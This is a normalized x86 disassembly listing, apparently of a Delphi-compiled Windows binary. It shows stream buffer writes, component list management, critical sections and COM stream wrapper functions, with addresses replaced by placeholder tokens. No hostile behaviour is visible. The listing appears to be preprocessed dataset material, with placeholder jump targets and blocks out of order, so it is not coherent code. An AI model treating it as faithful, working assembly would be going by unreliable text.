mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40cc2c
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b66
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub_418bc8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40e7a0
mov eax [ ebp - 0x4 ]
call sub_416a50
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
jmp [ eax * 4 + jump_table_418c0a ]
mov eax [ ebp - 0x4 ]
call sub_4184b0
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4175c0
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_40fa7c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4175c0
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_40fa7c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4175c0
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_40fa7c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4173a4
mov eax ebx
call sub_40fb0c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4173e8
mov eax ebx
call sub_40fb0c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41742c
mov eax ebx
call sub_40fb34
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41747c
mov eax ebx
call sub_40fb20
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418310
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40fb48
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4183cc
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40fb74
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4184b0
cmp al 0x9
sete dl
mov eax ebx
call sub_40fae4
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_418a00
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40eac8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41762c
push edx
push eax
mov eax ebx
call sub_40fab8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418dc9
lea eax [ ebp - 0x1c ]
call sub_40e7b4
lea eax [ ebp - 0xc ]
call sub_40464c
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax ebx
call sub_41032c
jmp r-xdata
sub_418dd0
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_418e1c
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_418e48
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_418fb8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418dd0
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_418fb8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_418dd0
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_418fb8
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_418dd0
jmp r-xdata
pop edx
pop ebx
retn
sub_418ecc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404378
je r-xdata
mov eax esi
call sub_40422c
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_40422c
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_418fb8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418dd0
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_418dd0
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_418fb8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418dd0
mov dl 0x6
mov eax ebx
call sub_418fb8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_418dd0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_418dd0
sub_418f64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405a1c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_418ecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418fb0
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_419040
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
call sub_419018
mov eax ebx
call sub_419024
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191b6
mov eax [ ebp - 0xc ]
call sub_403234
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413840
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413730
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41914a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_4191e0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_419398
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41922c
push ebx
push esi
push ecx
call sub_4035a8
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_419480
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_419428
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_413db8
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_4193f0
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403590
lea eax [ ebx + 0x14 ]
call sub_40cbf8
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_413840
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4192b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41389c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4136e4
mov edx ebx
mov eax esi
call sub_4192b0
sub_419344
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4136e4
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x10 ] eax
sub_419370
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_413984
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403234
xor eax eax
mov [ ebx + 0x10 ] eax
sub_419398
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403430
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_419344
mov dl 0x1
mov eax ebx
call sub_4198b8
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_419868
sub_4193f0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_4198b8
mov edx ebx
mov eax esi
call sub_419370
pop edi
pop esi
pop ebx
retn
sub_419428
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_413928
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_4193f0
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_419370
sub_419480
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_413840
call sub_419480
inc edi
dec esi
jne r-xdata
sub_4194bc
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_413984
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403234
xor eax eax
mov [ ebx + 0x14 ] eax
sub_4194e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4194bc
mov edx ebx
mov eax esi
call sub_4194bc
pop esi
pop ebx
retn
sub_4194fc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_4194e0
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413840
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_419558
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419304
push ebx
push sub_41932c
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_419318
push ebx
push sub_419338
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_419650
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407b48
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_4196e8
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
sub_4196e8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_413840
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407b48
test al al
jne r-xdata
sub_419738
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404378
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407c64
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
xor edx edx
mov eax ebx
call sub_4198b8
mov edx esi
mov eax ebx
call sub_4197c4
mov dl 0x1
mov eax ebx
call sub_4198b8
sub_4197d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413840
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4137cc
sub_419814
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_41389c
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413730
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_4138bc
sub_419868
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_419804
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_4197d8
mov cl 0x1
mov edx ebx
call sub_419868
inc edi
dec ebp
jne r-xdata
sub_4198b8
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404208
mov edx esp
mov eax esi
call sub_4034f0
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_419900
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_419928
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_419984
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4199c4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4199e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_419a08
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_419a50
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
mov edx esi
call sub_419c80
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_419ab8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_419c80
mov edx ebx
mov eax esi
call sub_419c74
sub_419afc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4191e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_419b40
push ebx
push esi
push edi
call sub_4035a8
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41922c
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_4194e0
jmp r-xdata
mov eax esi
call sub_413928
mov edx eax
mov eax edi
call sub_419c80
lea eax [ edi + 0x50 ]
call sub_40cbf8
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_419ba0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4194fc
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_419bcc
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_419be8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_419c04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_413840
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_419c80
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413730
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413840
cmp ebp eax
jne r-xdata
sub_419cc0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_4194e0
mov edx ebx
call sub_4192b0
sub_419cec
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_419d34
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403234
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_419d6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_419dbb
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419dd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_419e23
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419e3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_419ea6
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_419ec0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_419f09
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415504
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_419f24
push ebp
mov ebp esp
add esp 0xffffffd8
